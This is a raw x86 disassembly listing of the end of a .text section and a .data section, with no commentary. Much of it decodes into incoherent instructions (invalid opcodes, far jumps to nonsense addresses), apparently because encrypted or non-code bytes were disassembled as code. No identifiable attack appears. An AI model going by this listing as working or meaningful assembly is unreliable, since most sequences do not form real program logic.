  411c65:	jle    0x411c47
  411c67:	and    al,0x98
  411c69:	retf   0x6e97
  411c6c:	xchg   edi,eax
  411c6d:	bswap  edi
  411c6f:	jno    0x411c04
  411c71:	iret   
  411c72:	pop    es
  411c73:	pop    edx
  411c74:	push   esi
  411c75:	pop    ecx
  411c76:	or     DWORD PTR [esi],eax
  411c78:	fidiv  WORD PTR [edi+0x6b]
  411c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c7c:	gs mov bl,0x75
  411c7f:	xchg   edx,eax
  411c80:	push   es
  411c81:	addr16 and eax,0x7d915b2
  411c87:	mov    bl,0x4a
  411c8a:	jnp    0x411c68
  411c8c:	dec    esi
  411c8d:	cmp    ah,cl
  411c8f:	adc    ah,0xb2
  411c92:	sahf   
  411c93:	adc    ah,BYTE PTR [ebp+edi*2-0x4343208d]
  411c9a:	xor    al,BYTE PTR [ebx+0xa]
  411c9d:	clc    
  411c9e:	mov    BYTE PTR [edi-0x14901630],bh
  411ca4:	frstor [esi]
  411ca6:	lahf   
  411ca7:	pop    es
  411ca8:	add    al,0x99
  411caa:	mov    esp,0x61f55f40
  411caf:	dec    edi
  411cb0:	inc    esp
  411cb1:	push   eax
  411cb2:	retf   
  411cb3:	add    bl,BYTE PTR [ecx+0x76]
  411cb6:	push   ebx
  411cb7:	int    0x52
  411cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cba:	inc    edi
  411cbb:	jo     0x411cc9
  411cbd:	inc    ebp
  411cbe:	sbb    BYTE PTR [ebx],al
  411cc0:	or     ebp,DWORD PTR [edx+edx*4+0x50]
  411cc4:	out    dx,al
  411cc5:	es jmp 0x411cc2
  411cc8:	mov    cl,BYTE PTR ds:0x36c1c245
  411cce:	adc    bh,BYTE PTR [eax+0x5]
  411cd1:	pop    ebx
  411cd2:	dec    eax
  411cd3:	jg     0x411c96
  411cd5:	inc    eax
  411cd6:	mov    bh,0x1c
  411cd8:	sub    dl,BYTE PTR ds:0x8c8c452a
  411cde:	shr    DWORD PTR [ebp+0x6ec2642a],cl
  411ce4:	(bad)  
  411ce5:	push   edx
  411ce6:	outs   dx,DWORD PTR ds:[esi]
  411ce7:	mov    bh,0x2
  411ce9:	push   es
  411cea:	push   ebp
  411ceb:	mov    cl,0x30
  411ced:	adc    BYTE PTR [ebp-0x77],bl
  411cf0:	jbe    0x411ca5
  411cf2:	xor    al,0x6d
  411cf4:	es scas al,BYTE PTR es:[edi]
  411cf6:	icebp  
  411cf7:	scas   al,BYTE PTR es:[edi]
  411cf8:	xchg   ecx,eax
  411cf9:	adc    eax,0xcc77c3e8
  411cfe:	push   0x8a650e53
  411d03:	in     al,0xd1
  411d05:	or     al,bl
  411d07:	call   esi
  411d09:	popa   
  411d0a:	sar    DWORD PTR ds:0xe9aebab6,1
  411d10:	jo     0x411d88
  411d12:	push   esi
  411d13:	sar    DWORD PTR [eax],0x24
  411d16:	xor    ch,al
  411d18:	loop   0x411cdc
  411d1a:	dec    edi
  411d1b:	lods   al,BYTE PTR ds:[esi]
  411d1c:	stc    
  411d1d:	js     0x411d49
  411d1f:	dec    edx
  411d20:	test   BYTE PTR [eax+0x21c9e5d5],dh
  411d26:	adc    BYTE PTR ds:0x9cc5f220,0xcc
  411d2d:	jno    0x411d71
  411d2f:	and    edx,DWORD PTR [ecx+0x5dbfa5f8]
  411d35:	mov    bh,0xb2
  411d37:	aad    0xad
  411d39:	mov    esp,0xd431741a
  411d3e:	mov    bl,0x3a
  411d40:	dec    eax
  411d41:	cli    
  411d42:	and    cl,cl
  411d44:	icebp  
  411d45:	sub    DWORD PTR [eax+ecx*1-0x1d6e9e8c],ecx
  411d4c:	cwde   
  411d4d:	dec    esp
  411d4e:	lods   eax,DWORD PTR ds:[esi]
  411d4f:	or     edi,DWORD PTR [ecx+edx*4-0x12]
  411d53:	mov    eax,ds:0xbe293278
  411d58:	into   
  411d59:	ja     0x411cfb
  411d5b:	and    ah,dh
  411d5d:	lahf   
  411d5e:	mov    ds:0xe067ae1d,eax
  411d63:	xchg   BYTE PTR [ecx],bh
  411d65:	rcl    ah,cl
  411d67:	mov    ds:0xa577ac63,al
  411d6c:	lods   eax,DWORD PTR ds:[esi]
  411d6d:	sub    eax,0xf619a756
  411d72:	mov    al,ds:0x5b03ff1
  411d77:	fsub   QWORD PTR [esp+edi*8-0x36726269]
  411d7e:	sbb    dh,BYTE PTR [ebx]
  411d80:	jmp    0xcc753d43
  411d85:	pop    esp
  411d86:	mov    al,0xed
  411d88:	add    ecx,DWORD PTR [esi-0x77a3cefa]
  411d8e:	std    
  411d8f:	jecxz  0x411d49
  411d91:	hlt    
  411d92:	mov    bl,0x6a
  411d94:	mov    ecx,0x880e64
  411d99:	(bad)  
  411d9b:	enter  0xddd0,0x7e
  411d9f:	xchg   ecx,eax
  411da0:	mul    BYTE PTR ds:0xe0c320a6
  411da6:	lahf   
  411da7:	xor    al,0x99
  411da9:	lahf   
  411daa:	cmp    dh,cl
  411dac:	xor    al,0xfb
  411dae:	jge    0x411dae
  411db0:	pop    esp
  411db1:	fwait
  411db2:	sahf   
  411db3:	mov    al,0x13
  411db5:	sbb    ebp,DWORD PTR [edi+0x28]
  411db8:	ins    BYTE PTR es:[edi],dx
  411db9:	sahf   
  411dba:	inc    edi
  411dbb:	in     eax,0x4a
  411dbd:	dec    ebx
  411dbe:	pop    ss
  411dbf:	jg     0x411dc0
  411dc1:	ficom  WORD PTR [esi+0x78c62909]
  411dc7:	fwait
  411dc8:	jns    0x411da0
  411dca:	xchg   DWORD PTR [edi+0x132cd7d7],esp
  411dd0:	test   BYTE PTR [ecx-0x1da57f92],0xc9
  411dd7:	sbb    cl,BYTE PTR [eax+0x53]
  411dda:	sub    al,bh
  411ddc:	aas    
  411ddd:	mov    ?,WORD PTR [eax]
  411ddf:	(bad)  
  411de0:	cli    
  411de1:	aad    0x97
  411de3:	jno    0x411e15
  411de5:	dec    esp
  411de6:	aaa    
  411de7:	pop    esp
  411de8:	push   eax
  411de9:	pop    ecx
  411dea:	push   esp
  411deb:	cdq    
  411dec:	jp     0x411d81
  411dee:	arpl   WORD PTR [esi+0x1f],bx
  411df1:	jecxz  0x411db4
  411df3:	sub    dh,bl
  411df5:	ficom  WORD PTR [edi-0x51]
  411df8:	push   esi
  411df9:	jg     0x411e3b
  411dfb:	dec    edx
  411dfc:	icebp  
  411dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dfe:	icebp  
  411dff:	retf   0x274d
  411e02:	pop    ss
  411e03:	sub    eax,0xd6cb9ffe
  411e08:	out    dx,eax
  411e09:	call   0xda70:0x36a1d527
  411e10:	adc    BYTE PTR [eax],al
  411e12:	fstp   QWORD PTR [bp+di+0x3a35]
  411e17:	(bad)  
  411e18:	ret    0x7c02
  411e1b:	mov    cl,0xb8
  411e1d:	pop    edx
  411e1e:	mov    dl,0xb4
  411e20:	rol    BYTE PTR [ebp-0x78eb85cd],0xf
  411e27:	int    0x4c
  411e29:	in     al,0x5f
  411e2b:	jmp    0xede8:0xe5194758
  411e32:	mov    ds:0x2dc585c9,eax
  411e37:	call   0x25cb:0x6c70bc02
  411e3e:	jp     0x411dd0
  411e40:	call   0xf9edfef7
  411e45:	pop    eax
  411e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e47:	pusha  
  411e48:	in     al,0x4a
  411e4a:	iret   
  411e4b:	out    0x76,eax
  411e4d:	jecxz  0x411e79
  411e4f:	lahf   
  411e50:	jns    0x411e42
  411e52:	sbb    BYTE PTR [edx],al
  411e54:	das    
  411e55:	jecxz  0x411dea
  411e57:	pop    edi
  411e58:	lahf   
  411e59:	mov    edi,DWORD PTR [eax+0x53]
  411e5c:	add    ebp,edx
  411e5e:	mov    ecx,ecx
  411e60:	pop    ebx
  411e61:	cwde   
  411e62:	push   ss
  411e63:	jp     0x411ec6
  411e65:	push   ebp
  411e66:	(bad)  
  411e67:	std    
  411e68:	fld    st(3)
  411e6a:	push   eax
  411e6b:	fisubr DWORD PTR [edi-0x1c9d4af1]
  411e71:	iret   
  411e72:	ret    
  411e73:	ins    DWORD PTR es:[edi],dx
  411e74:	inc    esi
  411e75:	dec    esp
  411e76:	jge    0x411e05
  411e78:	test   eax,0x4b27720b
  411e7d:	dec    edi
  411e7e:	daa    
  411e7f:	mov    ch,0x86
  411e81:	mov    ebx,0x4639755a
  411e86:	push   esp
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
